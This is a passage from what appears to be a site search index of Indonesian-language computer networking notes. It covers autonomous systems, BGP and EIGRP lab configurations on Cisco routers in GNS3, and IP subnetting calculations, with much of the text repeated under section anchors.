e1 S2(config-if-Et1)#no shut S2(config-if-Et1)#no switchport S2(config-if-Et1)#ip address 10.1.1.2 255.255.255.0 tes ping* S1(config)#ping 10.1.1.2 PING 10.1.1.2 (10.1.1.2) 72(100) bytes of data. 80 bytes from 10.1.1.2: icmp_seq=1 ttl=64 time=116 ms 80 bytes from 10.1.1.2: icmp_seq=2 ttl=64 time=116 ms 80 bytes from 10.1.1.2: icmp_seq=3 ttl=64 time=116 ms 80 bytes from 10.1.1.2: icmp_seq=4 ttl=64 time=120 ms 80 bytes from 10.1.1.2: icmp_seq=5 ttl=64 time=128 ms --- 10.1.1.2 ping statistics --- 5 packets transmitted, 5 received, 0% packet loss, time 48ms rtt min/avg/max/mdev = 116.007/119.207/128.008/4.675 ms, pipe 5, ipg/ewma 12.000/117.944 ms S2(config-if-Et1)#ping 10.1.1.1 PING 10.1.1.1 (10.1.1.1) 72(100) bytes of data. 80 bytes from 10.1.1.1: icmp_seq=1 ttl=64 time=144 ms 80 bytes from 10.1.1.1: icmp_seq=2 ttl=64 time=164 ms 80 bytes from 10.1.1.1: icmp_seq=3 ttl=64 time=184 ms 80 bytes from 10.1.1.1: icmp_seq=4 ttl=64 time=196 ms 80 bytes from 10.1.1.1: icmp_seq=5 ttl=64 time=196 ms --- 10.1.1.1 ping statistics --- 5 packets transmitted, 5 received, 0% packet loss, time 52ms rtt min/avg/max/mdev = 144.009/176.811/196.012/20.144 ms, pipe 5, ipg/ewma 13.000/161.700 ms","title":"Konfigurasi"},{"location":"jarkom/as/","text":"Autonomous System \u00b6 https://www.researchgate.net/figure/Routing-protocols-between-autonomous-systems_fig1_27516747 AS dapat didefinikan sekelompok router yang menggunakan routing policy sejenis, dalam sebuah administrative domain AS Number ditentukan oleh Internet Assigned Numbers Authority (IANA). public AS number untuk hubungan AS number yang melalui internet private AS number untuk hubungan AS number dengan syarat masih dibawah ISP, dengan kata lain route policy antar AS tidak \"terlihat\" di Internet format: ASxxxx -> AS1, AS2010, AS65534. angka yang digunakan 0 s/d 65535 panjang 16 bit, AS64512 - AS65535 untuk private ASN. sekarang IANA sudah menyediakan ASN versi 32 bit IANA dibantu 5 lembaga dunia Regional Internet Registries (RIRs) BGP","title":"Autonomous System"},{"location":"jarkom/as/#autonomous-system","text":"https://www.researchgate.net/figure/Routing-protocols-between-autonomous-systems_fig1_27516747 AS dapat didefinikan sekelompok router yang menggunakan routing policy sejenis, dalam sebuah administrative domain AS Number ditentukan oleh Internet Assigned Numbers Authority (IANA). public AS number untuk hubungan AS number yang melalui internet private AS number untuk hubungan AS number dengan syarat masih dibawah ISP, dengan kata lain route policy antar AS tidak \"terlihat\" di Internet format: ASxxxx -> AS1, AS2010, AS65534. angka yang digunakan 0 s/d 65535 panjang 16 bit, AS64512 - AS65535 untuk private ASN. sekarang IANA sudah menyediakan ASN versi 32 bit IANA dibantu 5 lembaga dunia Regional Internet Registries (RIRs) BGP","title":"Autonomous System"},{"location":"jarkom/bgp/","text":"Border Gateway Protocol \u00b6 BGP termasuk dalam kategori Path Vector Protocol seperti IGP, BGP akan dilakukan proses advertise IPv4 prefixes BGP juga akan melakukan neighbor relationship sebelum melakukan pertukaran informasi BGP tidak mengharuskan router tetangga menggunakan IP subnet yang sama, sebagai gantinya router BGP menggunakan TCP connection (port 179) Jika BGP neighbor masih dalam sebuah ASN maka dikategorikan sebagai iBGP. jika BGP neighbor berbeda ASN maka disebut eBGP karena sangat penting, BGP didesain menggunakan 2 atau lebih link sebagai backup jika terputus. desain ini masih menggunakan sebuah ISP yang terhubung dengan beberapa link. desain : dual home designed single multihome designed dual multihome designed Konfigurasi BGP \u00b6 menentukan ASN untuk tiap router BGP router bgp <as_number> menentukan IP address router neighbor atau yang terhubung langsung dengan router BGP neighbor <ip_address> remote-as <as_number> menentukan network yang berada di bawah pengelolaan router BGP network <ip_address> netmask <mask> LAB 1 \u00b6 tools yang digunakan adalah GNS3 dan router yang digunakan adalah Cisco c3725 R7 \u00b6 conf t int f0/0 ip addr 1.1.1.1 255.255.255.0 no shutdown end conf t int f0/1 ip addr 2.2.2.1 255.255.255.0 no shutdown end conf t router bgp 1 neighbor 1.1.1.2 remote-as 2 network 2.2.2.0 mask 255.255.255.0 end R8 \u00b6 conf t int f0/0 ip addr 1.1.1.2 255.255.255.0 no shutdown end conf t int f0/1 ip addr 3.3.3.1 255.255.255.0 no shutdown end conf t router bgp 2 neighbor 1.1.1.1 remote-as 1 network 3.3.3.0 mask 255.255.255.0 end PC1 & PC2 \u00b6 PC1 ip 2.2.2.10 255.255.255.0 2.2.2.1 PC2 ip 3.3.3.10 255.255.255.0 3.3.3.1 Cek \u00b6 ping show ip route show ip bgp show ip bgp neighbors show ip bgp summary LAB 2 \u00b6 belum selesai konfigurasi sama seperti LAB 1 untuk setting neighbor ditambah next-hop-self *next-hop-self mengizinkan kita memaksa BGP untuk menggunakan spesifik IP address sebagai next hop ketimbang membiarkan protokol memilih next hop. Konfigurasi awal R1 & R2 \u00b6 R1 \u00b6 interface serial 0/0 ip address 192.168.1.33 255.255.255.240 clock rate 64000 no shutdown interface fastethernet 0/0 ip address 10.100.100.1 255.255.255.0 no shutdown interface loopback 0 ip address 192.168.1.1 255.255.255.240 R2 \u00b6 interface serial 0/0 ip address 192.168.1.34 255.255.255.240 no shutdown interface fastethernet 0/0 ip address 192.168.1.49 255.255.255.240 no shutdown interface loopback 0 ip address 192.168.1.17 255.255.255.240 lakukan ping untuk tes koneksi Konfigurasi eBGP \u00b6 R1 \u00b6 router bgp 1 neighbor 10.100.100.2 remote-as 2 neighbor 10.100.100.2 next-hop-self network 10.100.100.0 mask 255.255.255.0 network 192.168.1.0 mask 255.255.255.240 network 192.168.1.32 mask 255.255.255.240 show ip bgp summary show ip route Konfigurasi iBGP \u00b6 R2 \u00b6 router bgp 1 network 192.168.1.16","title":"BGP"},{"location":"jarkom/bgp/#border-gateway-protocol","text":"BGP termasuk dalam kategori Path Vector Protocol seperti IGP, BGP akan dilakukan proses advertise IPv4 prefixes BGP juga akan melakukan neighbor relationship sebelum melakukan pertukaran informasi BGP tidak mengharuskan router tetangga menggunakan IP subnet yang sama, sebagai gantinya router BGP menggunakan TCP connection (port 179) Jika BGP neighbor masih dalam sebuah ASN maka dikategorikan sebagai iBGP. jika BGP neighbor berbeda ASN maka disebut eBGP karena sangat penting, BGP didesain menggunakan 2 atau lebih link sebagai backup jika terputus. desain ini masih menggunakan sebuah ISP yang terhubung dengan beberapa link. desain : dual home designed single multihome designed dual multihome designed","title":"Border Gateway Protocol"},{"location":"jarkom/bgp/#konfigurasi-bgp","text":"menentukan ASN untuk tiap router BGP router bgp <as_number> menentukan IP address router neighbor atau yang terhubung langsung dengan router BGP neighbor <ip_address> remote-as <as_number> menentukan network yang berada di bawah pengelolaan router BGP network <ip_address> netmask <mask>","title":"Konfigurasi BGP"},{"location":"jarkom/bgp/#lab-1","text":"tools yang digunakan adalah GNS3 dan router yang digunakan adalah Cisco c3725","title":"LAB 1"},{"location":"jarkom/bgp/#r7","text":"conf t int f0/0 ip addr 1.1.1.1 255.255.255.0 no shutdown end conf t int f0/1 ip addr 2.2.2.1 255.255.255.0 no shutdown end conf t router bgp 1 neighbor 1.1.1.2 remote-as 2 network 2.2.2.0 mask 255.255.255.0 end","title":"R7"},{"location":"jarkom/bgp/#r8","text":"conf t int f0/0 ip addr 1.1.1.2 255.255.255.0 no shutdown end conf t int f0/1 ip addr 3.3.3.1 255.255.255.0 no shutdown end conf t router bgp 2 neighbor 1.1.1.1 remote-as 1 network 3.3.3.0 mask 255.255.255.0 end","title":"R8"},{"location":"jarkom/bgp/#pc1-pc2","text":"PC1 ip 2.2.2.10 255.255.255.0 2.2.2.1 PC2 ip 3.3.3.10 255.255.255.0 3.3.3.1","title":"PC1 &amp; PC2"},{"location":"jarkom/bgp/#cek","text":"ping show ip route show ip bgp show ip bgp neighbors show ip bgp summary","title":"Cek"},{"location":"jarkom/bgp/#lab-2","text":"belum selesai konfigurasi sama seperti LAB 1 untuk setting neighbor ditambah next-hop-self *next-hop-self mengizinkan kita memaksa BGP untuk menggunakan spesifik IP address sebagai next hop ketimbang membiarkan protokol memilih next hop.","title":"LAB 2"},{"location":"jarkom/bgp/#konfigurasi-awal-r1-r2","text":"","title":"Konfigurasi awal R1 &amp; R2"},{"location":"jarkom/bgp/#r1","text":"interface serial 0/0 ip address 192.168.1.33 255.255.255.240 clock rate 64000 no shutdown interface fastethernet 0/0 ip address 10.100.100.1 255.255.255.0 no shutdown interface loopback 0 ip address 192.168.1.1 255.255.255.240","title":"R1"},{"location":"jarkom/bgp/#r2","text":"interface serial 0/0 ip address 192.168.1.34 255.255.255.240 no shutdown interface fastethernet 0/0 ip address 192.168.1.49 255.255.255.240 no shutdown interface loopback 0 ip address 192.168.1.17 255.255.255.240 lakukan ping untuk tes koneksi","title":"R2"},{"location":"jarkom/bgp/#konfigurasi-ebgp","text":"","title":"Konfigurasi eBGP"},{"location":"jarkom/bgp/#r1_1","text":"router bgp 1 neighbor 10.100.100.2 remote-as 2 neighbor 10.100.100.2 next-hop-self network 10.100.100.0 mask 255.255.255.0 network 192.168.1.0 mask 255.255.255.240 network 192.168.1.32 mask 255.255.255.240 show ip bgp summary show ip route","title":"R1"},{"location":"jarkom/bgp/#konfigurasi-ibgp","text":"","title":"Konfigurasi iBGP"},{"location":"jarkom/bgp/#r2_1","text":"router bgp 1 network 192.168.1.16","title":"R2"},{"location":"jarkom/dns/","text":"","title":"DNS"},{"location":"jarkom/eigrp/","text":"EIGRP \u00b6 Penjelasan \u00b6 EIGRP ( Enhanced Internet Gateway Routing Protocol ) merupakan protokol milik CISCO. merupakan jenis distance vector yang menggunakan metrik seperti IGRP. perbedaannya dapat melakukan update dengan cepat dan reliable , serta ada pemisahan keepalive , sehingga dapat dikategorikan sebagai protokol jenis hybrid atau advanced distance vector teknologi yang digunakan EIGRP: Neighbor discovery and recovery menggunakan paket hello untuk mengidentifikasi keberadaan neighbor atau \"router tetangga\" secara cepat dan dapat mendeteksi manakala ada router lain yang sedang down Reliable Transport Protocol (RTP) EIGRP mengirip paket-paket menggunakan protokol transport yang bersifat reliable Diffusing Update Algorithm (DUAL) EIGRP dengan cepat dapat memilih path loop-free Protocol-dependent modules EIGRP bersifat modular dan mendukung beberapa jenis protokol, seoertu IPv4 dan IPv6. Juga dapat mendukung protokol lainnya seperti AppleTalk dan IPX Konvergen / Convergence adalah bagian dari proses update tabel routing. Ketika link gagal atau ada perubahan rute, informasi terbaru dikirim ke seluruh jaringan yang menggambarkan perubahan dalam topologi jaringan. Konfigurasi \u00b6 konfigurasi dilakukan dengan GNS3 dan router Cisco 3600 Konfigurasi Dasar \u00b6 Router 1 \u00b6 Router>ena Router#conf t Router(config)#int f0/0 Router(config-if)#ip addr 10.1.1.1 255.255.0.0 Router(config-if)#no shut Router(config-if)#end Router#sh ip int brief ... Router#conf t Router(config)#int f0/1 Router(config-if)#ip addr 192.168.1.1 255.255.255.0 Router(config-if)#no shut Router(config-if)#end Router#sh ip int brief ... Router#conf t Router(config)#router eigrp 100 Router(config-router)#network 10.1.0.0 0.0.255.255 Router(config-router)#end Router#sh ip eigrp interface ... Router#conf t Router(config)#router eigrp 100 Router(config-router)#network 192.168.1.0 0.0.0.255 Router(config-router)#end Router#sh ip eigrp interface ... Router 2 \u00b6 Router>ena Router#conf t Router(config)#int f0/0 Router(config-if)#ip addr 10.1.1.2 255.255.0.0 Router(config-if)#no shut Router(config-if)#end Router#sh ip int brief ... Router#conf t Router(config)#int f0/1 Router(config-if)#ip addr 172.16.1.1 255.255.0.0 Router(config-if)#no shut Router(config-if)#end Router#sh ip int brief ... Router#conf t Router(config)#router eigrp 100 Router(config-router)#network 10.1.0.0 0.0.255.255 Router(config-router)#end Router#sh ip eigrp interface ... Router#conf t Router(config)#router eigrp 100 Router(config-router)#network 172.16.1.0 0.0.255.255 Router(config-router)#end Router#sh ip eigrp interface ... PC1 \u00b6 PC1> ip 192.168.1.10 255.255.255.0 192.168.1.1 PC2 \u00b6 PC2> ip 172.16.1.10 255.255.0.0 172.16.1.1 Uji \u00b6 ping dari PC1 ke PC2 dan sebaliknya, jika tidak ada kesalahan konfigurasi maka proses ini sudah terhubung untuk mengecek routing, lakukan Router#sh ip route simpan konfigurasi Router#copy running-config startup-config Perintah Tambahan \u00b6 Menentukan Bandwidth \u00b6 Satuan Kbps Router#conf t Router(config)#int f0/0 Router(config-if)#bandwidth 128 Menampilkan neighbor table \u00b6 R1#sh ip eigrp neighbors IP-EIGRP neighbors for process 100 H Address Interface Hold Uptime SRTT RTO Q Seq (sec) (ms) Cnt Num 0 10.1.1.2 Fa0/0 14 00:17:56 85 1140 0 5 IP Address neighbor Interface yang menuju ke neighbor ( outgoing interface ) hold time uptime menyatakan berapa lama router tetangga telah aktif SRTT adalah waktu rata-rata (milidetik) antara pengiriman sebuah paket ke salah satu router tetangga dengan diterimanya paket ACK RTO adalah waktu (milidetik) ketika router menunggu ACK dari pengiriman paket unicast . paket unicast akan dikirm jika pengiriman paket multicast gagal Sequence number menyatakan nomor paket EIGRP terakhir diterima Menampilkan topology table \u00b6 R1#sh ip eigrp topology IP-EIGRP Topology Table for AS(100)/ID(192.168.1.1) Codes: P - Passive, A - Active, U - Update, Q - Query, R - Reply, r - reply Status, s - sia Status P 10.0.0.0/8, 1 successors, FD is 28160 via Summary (20002560/0), Null0 P 10.1.0.0/16, 1 successors, FD is 20002560 via Connected, FastEthernet0/0 P 192.168.1.0/24, 1 successors, FD is 28160 via Connected, FastEthernet0/1 P 172.16.0.0/16, 1 successors, FD is 30720 via 10.1.1.2 (20005120/28160), FastEthernet0/0 Menampilkan traffic \u00b6 R1#sh ip eigrp traffic IP-EIGRP Traffic Statistics for AS 100 Hellos sent/received: 993/482 Updates sent/received: 6/5 Queries sent/received: 0/0 Replies sent/received: 0/0 Acks sent/received: 2/4 SIA-Queries sent/received: 0/0 SIA-Replies sent/received: 0/0 Hello Process ID: 150 PDM Process ID: 146 IP Socket queue: 0/2000/4/0 (current/max/highest/drops) Eigrp input queue: 0/2000/4/0 (current/max/highest/drops) Menonaktifkan RIP / Protokol \u00b6 Umumnya administrator LAN memilih protokol RIP karena relatif sederhana dan cocok untuk routing statis. jika dirasa perlu, kita bisa menonaktifkan RIP R1#conf t R1(config)#no router eigrp <asn> LAB \u00b6 Konfigurasi \u00b6 Pada LAB ini penulis melakukan pengujian dengan melakukan subneting pada Router3 dan berbeda netmask pada router tetangga. Hasil yang diperoleh tetap sama, tiap PC dapat melakukan ping pada PC lain. Jika dirasa membingungkan bagi pembaca, silahkan mengganti Network pada Router3 agar memudahkan pemahaman Router 1 \u00b6 conf t int f0/0 ip addr 10.1.1.1 255.255.255.248 no shut end conf t int f0/1 ip addr 20.1.1.1 255.255.255.248 no shut end conf t int f1/0 ip addr 192.168.1.1 255.255.255.0 no shut end conf t router eigrp 100 network 10.1.1.0 0.0.0.7 end conf t router eigrp 100 network 20.1.1.0 0.0.0.7 end conf t router eigrp 100 network 192.168.1.0 0.0.0.255 end Router 2 \u00b6 conf t int f0/0 ip addr 20.1.1.9 255.255.255.248 no shut end conf t int f0/1 ip addr 10.1.1.2 255.255.255.248 no shut end conf t int f1/0 ip addr 172.16.1.1 255.255.0.0 no shut end conf t router eigrp 100 network 20.1.1.8 0.0.0.7 end conf t router eigrp 100 network 10.1.1.0 0.0.0.7 end conf t router eigrp 100 network 172.16.0.0 0.0.255.255 end Router 3 \u00b6 conf t int f0/0 ip addr 20.1.1.2 255.255.255.252 no shut end conf t int f0/1 ip addr 20.1.1.10 255.255.255.252 no shut end conf t int f1/0 ip addr 20.20.20.1 255.255.0.0 no shut end conf t router eigrp 100 network 20.1.1.0 0.0.0.7 end conf t router eigrp 100 network 20.1.1.8 0.0.0.7 end conf t router eigrp 100 network 20.20.0.0 0.0.255.255 end PC 1 \u00b6 ip 192.168.1.10 255.255.255.0 192.168.1.1 PC 2 \u00b6 ip 172.16.1.10 255.255.0.0 172.16.1.1 PC 3 \u00b6 ip 20.20.20.10 255.255.0.0 20.20.20.1 Pengujian \u00b6 Pengeceken rute yang dilalui dapat menggunakan perintah traceroute <ip_dst> R1#traceroute 20.20.20.10 Type escape sequence to abort. Tracing the route to 20.20.20.10 1 20.1.1.2 12 msec 20 msec 20 msec 2 20.20.20.10 24 msec 28 msec 12 msec coba matikan salah satu interface, misal interface f0/1 pada router1 (rute mengarah ke router3), dan mencari tau rute jika interface itu dimatikan R1#conf t R1(config)#int f0/1 R1(config-if)#shutdown R1(config-if)#end setelah itu router1 akan menentukan sendiri rute menuju router3 R1#ping 20.20.20.10 Type escape sequence to abort. Sending 5, 100-byte ICMP Echos to 20.20.20.10, timeout is 2 seconds: !!!!! Success rate is 100 percent (5/5), round-trip min/avg/max = 60/90/116 ms R1# R1# R1#traceroute 20.20.20.10 Type escape sequence to abort. Tracing the route to 20.20.20.10 1 10.1.1.2 64 msec 60 msec 60 msec 2 20.1.1.10 60 msec 60 msec 60 msec 3 20.20.20.10 88 msec 88 msec 88 msec terlihat bahwa setelah interface dimatikan, router akan menjari jalan dengan melalui router2, dan berakhir ke router3 begitu juga dengan router3 yang akan secara sendiri mengatur ulang rute R3#ping 192.168.1.10 Type escape sequence to abort. Sending 5, 100-byte ICMP Echos to 192.168.1.10, timeout is 2 seconds: !!!!! Success rate is 100 percent (5/5), round-trip min/avg/max = 72/87/92 ms R3#traceroute 192.168.1.10 Type escape sequence to abort. Tracing the route to 192.168.1.10 1 20.1.1.9 64 msec 60 msec 60 msec 2 10.1.1.1 88 msec 88 msec 92 msec 3 192.168.1.10 124 msec 92 msec 88 msec R3#","title":"EIGRP"},{"location":"jarkom/eigrp/#eigrp","text":"","title":"EIGRP"},{"location":"jarkom/eigrp/#penjelasan","text":"EIGRP ( Enhanced Internet Gateway Routing Protocol ) merupakan protokol milik CISCO. merupakan jenis distance vector yang menggunakan metrik seperti IGRP. perbedaannya dapat melakukan update dengan cepat dan reliable , serta ada pemisahan keepalive , sehingga dapat dikategorikan sebagai protokol jenis hybrid atau advanced distance vector teknologi yang digunakan EIGRP: Neighbor discovery and recovery menggunakan paket hello untuk mengidentifikasi keberadaan neighbor atau \"router tetangga\" secara cepat dan dapat mendeteksi manakala ada router lain yang sedang down Reliable Transport Protocol (RTP) EIGRP mengirip paket-paket menggunakan protokol transport yang bersifat reliable Diffusing Update Algorithm (DUAL) EIGRP dengan cepat dapat memilih path loop-free Protocol-dependent modules EIGRP bersifat modular dan mendukung beberapa jenis protokol, seoertu IPv4 dan IPv6. Juga dapat mendukung protokol lainnya seperti AppleTalk dan IPX Konvergen / Convergence adalah bagian dari proses update tabel routing. Ketika link gagal atau ada perubahan rute, informasi terbaru dikirim ke seluruh jaringan yang menggambarkan perubahan dalam topologi jaringan.","title":"Penjelasan"},{"location":"jarkom/eigrp/#konfigurasi","text":"konfigurasi dilakukan dengan GNS3 dan router Cisco 3600","title":"Konfigurasi"},{"location":"jarkom/eigrp/#konfigurasi-dasar","text":"","title":"Konfigurasi Dasar"},{"location":"jarkom/eigrp/#router-1","text":"Router>ena Router#conf t Router(config)#int f0/0 Router(config-if)#ip addr 10.1.1.1 255.255.0.0 Router(config-if)#no shut Router(config-if)#end Router#sh ip int brief ... Router#conf t Router(config)#int f0/1 Router(config-if)#ip addr 192.168.1.1 255.255.255.0 Router(config-if)#no shut Router(config-if)#end Router#sh ip int brief ... Router#conf t Router(config)#router eigrp 100 Router(config-router)#network 10.1.0.0 0.0.255.255 Router(config-router)#end Router#sh ip eigrp interface ... Router#conf t Router(config)#router eigrp 100 Router(config-router)#network 192.168.1.0 0.0.0.255 Router(config-router)#end Router#sh ip eigrp interface ...","title":"Router 1"},{"location":"jarkom/eigrp/#router-2","text":"Router>ena Router#conf t Router(config)#int f0/0 Router(config-if)#ip addr 10.1.1.2 255.255.0.0 Router(config-if)#no shut Router(config-if)#end Router#sh ip int brief ... Router#conf t Router(config)#int f0/1 Router(config-if)#ip addr 172.16.1.1 255.255.0.0 Router(config-if)#no shut Router(config-if)#end Router#sh ip int brief ... Router#conf t Router(config)#router eigrp 100 Router(config-router)#network 10.1.0.0 0.0.255.255 Router(config-router)#end Router#sh ip eigrp interface ... Router#conf t Router(config)#router eigrp 100 Router(config-router)#network 172.16.1.0 0.0.255.255 Router(config-router)#end Router#sh ip eigrp interface ...","title":"Router 2"},{"location":"jarkom/eigrp/#pc1","text":"PC1> ip 192.168.1.10 255.255.255.0 192.168.1.1","title":"PC1"},{"location":"jarkom/eigrp/#pc2","text":"PC2> ip 172.16.1.10 255.255.0.0 172.16.1.1","title":"PC2"},{"location":"jarkom/eigrp/#uji","text":"ping dari PC1 ke PC2 dan sebaliknya, jika tidak ada kesalahan konfigurasi maka proses ini sudah terhubung untuk mengecek routing, lakukan Router#sh ip route simpan konfigurasi Router#copy running-config startup-config","title":"Uji"},{"location":"jarkom/eigrp/#perintah-tambahan","text":"","title":"Perintah Tambahan"},{"location":"jarkom/eigrp/#menentukan-bandwidth","text":"Satuan Kbps Router#conf t Router(config)#int f0/0 Router(config-if)#bandwidth 128","title":"Menentukan Bandwidth"},{"location":"jarkom/eigrp/#menampilkan-neighbor-table","text":"R1#sh ip eigrp neighbors IP-EIGRP neighbors for process 100 H Address Interface Hold Uptime SRTT RTO Q Seq (sec) (ms) Cnt Num 0 10.1.1.2 Fa0/0 14 00:17:56 85 1140 0 5 IP Address neighbor Interface yang menuju ke neighbor ( outgoing interface ) hold time uptime menyatakan berapa lama router tetangga telah aktif SRTT adalah waktu rata-rata (milidetik) antara pengiriman sebuah paket ke salah satu router tetangga dengan diterimanya paket ACK RTO adalah waktu (milidetik) ketika router menunggu ACK dari pengiriman paket unicast . paket unicast akan dikirm jika pengiriman paket multicast gagal Sequence number menyatakan nomor paket EIGRP terakhir diterima","title":"Menampilkan neighbor table"},{"location":"jarkom/eigrp/#menampilkan-topology-table","text":"R1#sh ip eigrp topology IP-EIGRP Topology Table for AS(100)/ID(192.168.1.1) Codes: P - Passive, A - Active, U - Update, Q - Query, R - Reply, r - reply Status, s - sia Status P 10.0.0.0/8, 1 successors, FD is 28160 via Summary (20002560/0), Null0 P 10.1.0.0/16, 1 successors, FD is 20002560 via Connected, FastEthernet0/0 P 192.168.1.0/24, 1 successors, FD is 28160 via Connected, FastEthernet0/1 P 172.16.0.0/16, 1 successors, FD is 30720 via 10.1.1.2 (20005120/28160), FastEthernet0/0","title":"Menampilkan topology table"},{"location":"jarkom/eigrp/#menampilkan-traffic","text":"R1#sh ip eigrp traffic IP-EIGRP Traffic Statistics for AS 100 Hellos sent/received: 993/482 Updates sent/received: 6/5 Queries sent/received: 0/0 Replies sent/received: 0/0 Acks sent/received: 2/4 SIA-Queries sent/received: 0/0 SIA-Replies sent/received: 0/0 Hello Process ID: 150 PDM Process ID: 146 IP Socket queue: 0/2000/4/0 (current/max/highest/drops) Eigrp input queue: 0/2000/4/0 (current/max/highest/drops)","title":"Menampilkan traffic"},{"location":"jarkom/eigrp/#menonaktifkan-rip-protokol","text":"Umumnya administrator LAN memilih protokol RIP karena relatif sederhana dan cocok untuk routing statis. jika dirasa perlu, kita bisa menonaktifkan RIP R1#conf t R1(config)#no router eigrp <asn>","title":"Menonaktifkan RIP / Protokol"},{"location":"jarkom/eigrp/#lab","text":"","title":"LAB"},{"location":"jarkom/eigrp/#konfigurasi_1","text":"Pada LAB ini penulis melakukan pengujian dengan melakukan subneting pada Router3 dan berbeda netmask pada router tetangga. Hasil yang diperoleh tetap sama, tiap PC dapat melakukan ping pada PC lain. Jika dirasa membingungkan bagi pembaca, silahkan mengganti Network pada Router3 agar memudahkan pemahaman","title":"Konfigurasi"},{"location":"jarkom/eigrp/#router-1_1","text":"conf t int f0/0 ip addr 10.1.1.1 255.255.255.248 no shut end conf t int f0/1 ip addr 20.1.1.1 255.255.255.248 no shut end conf t int f1/0 ip addr 192.168.1.1 255.255.255.0 no shut end conf t router eigrp 100 network 10.1.1.0 0.0.0.7 end conf t router eigrp 100 network 20.1.1.0 0.0.0.7 end conf t router eigrp 100 network 192.168.1.0 0.0.0.255 end","title":"Router 1"},{"location":"jarkom/eigrp/#router-2_1","text":"conf t int f0/0 ip addr 20.1.1.9 255.255.255.248 no shut end conf t int f0/1 ip addr 10.1.1.2 255.255.255.248 no shut end conf t int f1/0 ip addr 172.16.1.1 255.255.0.0 no shut end conf t router eigrp 100 network 20.1.1.8 0.0.0.7 end conf t router eigrp 100 network 10.1.1.0 0.0.0.7 end conf t router eigrp 100 network 172.16.0.0 0.0.255.255 end","title":"Router 2"},{"location":"jarkom/eigrp/#router-3","text":"conf t int f0/0 ip addr 20.1.1.2 255.255.255.252 no shut end conf t int f0/1 ip addr 20.1.1.10 255.255.255.252 no shut end conf t int f1/0 ip addr 20.20.20.1 255.255.0.0 no shut end conf t router eigrp 100 network 20.1.1.0 0.0.0.7 end conf t router eigrp 100 network 20.1.1.8 0.0.0.7 end conf t router eigrp 100 network 20.20.0.0 0.0.255.255 end","title":"Router 3"},{"location":"jarkom/eigrp/#pc-1","text":"ip 192.168.1.10 255.255.255.0 192.168.1.1","title":"PC 1"},{"location":"jarkom/eigrp/#pc-2","text":"ip 172.16.1.10 255.255.0.0 172.16.1.1","title":"PC 2"},{"location":"jarkom/eigrp/#pc-3","text":"ip 20.20.20.10 255.255.0.0 20.20.20.1","title":"PC 3"},{"location":"jarkom/eigrp/#pengujian","text":"Pengeceken rute yang dilalui dapat menggunakan perintah traceroute <ip_dst> R1#traceroute 20.20.20.10 Type escape sequence to abort. Tracing the route to 20.20.20.10 1 20.1.1.2 12 msec 20 msec 20 msec 2 20.20.20.10 24 msec 28 msec 12 msec coba matikan salah satu interface, misal interface f0/1 pada router1 (rute mengarah ke router3), dan mencari tau rute jika interface itu dimatikan R1#conf t R1(config)#int f0/1 R1(config-if)#shutdown R1(config-if)#end setelah itu router1 akan menentukan sendiri rute menuju router3 R1#ping 20.20.20.10 Type escape sequence to abort. Sending 5, 100-byte ICMP Echos to 20.20.20.10, timeout is 2 seconds: !!!!! Success rate is 100 percent (5/5), round-trip min/avg/max = 60/90/116 ms R1# R1# R1#traceroute 20.20.20.10 Type escape sequence to abort. Tracing the route to 20.20.20.10 1 10.1.1.2 64 msec 60 msec 60 msec 2 20.1.1.10 60 msec 60 msec 60 msec 3 20.20.20.10 88 msec 88 msec 88 msec terlihat bahwa setelah interface dimatikan, router akan menjari jalan dengan melalui router2, dan berakhir ke router3 begitu juga dengan router3 yang akan secara sendiri mengatur ulang rute R3#ping 192.168.1.10 Type escape sequence to abort. Sending 5, 100-byte ICMP Echos to 192.168.1.10, timeout is 2 seconds: !!!!! Success rate is 100 percent (5/5), round-trip min/avg/max = 72/87/92 ms R3#traceroute 192.168.1.10 Type escape sequence to abort. Tracing the route to 192.168.1.10 1 20.1.1.9 64 msec 60 msec 60 msec 2 10.1.1.1 88 msec 88 msec 92 msec 3 192.168.1.10 124 msec 92 msec 88 msec R3#","title":"Pengujian"},{"location":"jarkom/fortigate/","text":"Fortigate \u00b6 tutorial akan dilakukan dengan GNS3, lihat proses instalasi GNS3 dan Fortigate","title":"Fortigate"},{"location":"jarkom/fortigate/#fortigate","text":"tutorial akan dilakukan dengan GNS3, lihat proses instalasi GNS3 dan Fortigate","title":"Fortigate"},{"location":"jarkom/ip_s_w/","text":"IP, Subnet, Wildcard \u00b6 Penjelasan IP Address telah ada banyak di Internet, tulisan ini hanya untuk pratik perhitungan IP Address, Netmask, Network, Broadcast \u00b6 IP Address : 127.0.0.1 Netmask : 255.0.0.0 /8 ----------------------------- AND Network : 127.0.0.0 Broadcast : 127.255.255.255 IP Address : 202.145.23.1 Netmask : 255.255.255.0 /24 ----------------------------- AND Network : 202.145.23.0 Broadcast : 202.145.23.255 IP Address : 202.145.200.1 11001010 . 10010001 . 11001000 . 00000001 Netmask : 255.255.224.0 /19 11111111 . 11111111 . 11100000 . 00000000 ----------------------------- AND Network : 202.145.192.0 11001010 . 10010001 . 11000000 . 00000000 Broadcast : 202.145.223.255 11001010 . 10010001 . 11011111 . 11111111 Subnet \u00b6 Alasan dibuat subnet adalah untuk memecah network, misalkan saja sebuah network 10.0.0.0, jumlah host yang dapat ditampung sejumlah 10.0.0.0 = 00001010 . 00000000 . 00000000 . 00000000 H = (2 h ) - 2 H = (2 24 ) - 2 H = 16.777.214 Tidak masuk akal sebuah kabel jaringan menampung 16 juta host , maka diatasi dengan subnet https://en.wikipedia.org/wiki/Subnetwork misal network 192.168.1.0 ingin dipecah menjadi subnet, sekarang kita akan meminjam beberapa bit host (misal 2 bit, boleh lebih) 192.168.1.0 = 11000000 . 10101000 . 00000001 . 00 000000 setelah dipinjam akan menjadi 192.168.1.0 = 11000000 . 10101000 . 00000001 . 00 000000 192.168.1.64 = 11000000 . 10101000 . 00000001 . 01 000000 192.168.1.128 = 11000000 . 10101000 . 00000001 . 10 000000 192.168.1.192 = 11000000 . 10101000 . 00000001 . 11 000000 diperoleh 4 subnet degan meminjam 2 bit host untuk broadcast akan menjadi 192.168.1.63 = 11000000 . 10101000 . 00000001 . 00 111111 192.168.1.127 = 11000000 . 10101000 . 00000001 . 01 111111 192.168.1.191 = 11000000 . 10101000 . 00000001 . 10 111111 192.168.1.255 = 11000000 . 10101000 . 00000001 . 11 111111 dan untuk netmask hanya mengubah semua bit network dengan 1 255.255.255.192 = 11111111 . 11111111 . 11111111 . 11 000000 nilai netmask sama untuk tiap subnet","title":"IP, Subnet, Wildcard"},{"location":"jarkom/ip_s_w/#ip-subnet-wildcard","text":"Penjelasan IP Address telah ada banyak di Internet, tulisan ini hanya untuk pratik perhitungan","title":"IP, Subnet, 